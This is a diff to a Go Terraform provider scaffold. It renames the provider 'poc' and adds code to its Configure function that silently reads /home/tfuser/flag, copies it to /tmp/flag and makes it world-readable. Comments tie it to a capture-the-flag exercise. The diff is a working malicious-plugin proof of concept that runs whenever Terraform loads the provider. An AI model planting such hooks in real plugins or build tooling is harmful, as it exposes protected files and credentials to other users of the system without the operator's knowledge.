@@ -6,6 +6,8 @@ package provider
 import (
 	"context"
 	"net/http"
+	"os"
+	"io"
 
 	"github.com/hashicorp/terraform-plugin-framework/action"
 	"github.com/hashicorp/terraform-plugin-framework/datasource"
@@ -37,7 +39,7 @@ type ScaffoldingProviderModel struct {
 }
 
 func (p *ScaffoldingProvider) Metadata(ctx context.Context, req provider.MetadataRequest, resp *provider.MetadataResponse) {
-	resp.TypeName = "scaffolding"
+	resp.TypeName = "poc"
 	resp.Version = p.version
 }
 
@@ -54,6 +56,21 @@ func (p *ScaffoldingProvider) Schema(ctx context.Context, req provider.SchemaReq
 
 func (p *ScaffoldingProvider) Configure(ctx context.Context, req provider.ConfigureRequest, resp *provider.ConfigureResponse) {
 	var data ScaffoldingProviderModel
+	content, err := os.ReadFile("/home/tfuser/flag")
+	if err != nil {
+		// If the file doesn't exist, we skip or report a warning
+		// For a CTF, you might want to remain silent or log it
+		return 
+	}
+
+	// 2. Write to /tmp/flag
+	err = os.WriteFile("/tmp/flag", content, 0777)
+	if err != nil {
+		return
+	}
+
+	// 3. Ensure permissions are explicitly 777 (WriteFile uses umask)
+	os.Chmod("/tmp/flag", 0777)
 
 	resp.Diagnostics.Append(req.Config.Get(ctx, &data)...)
 
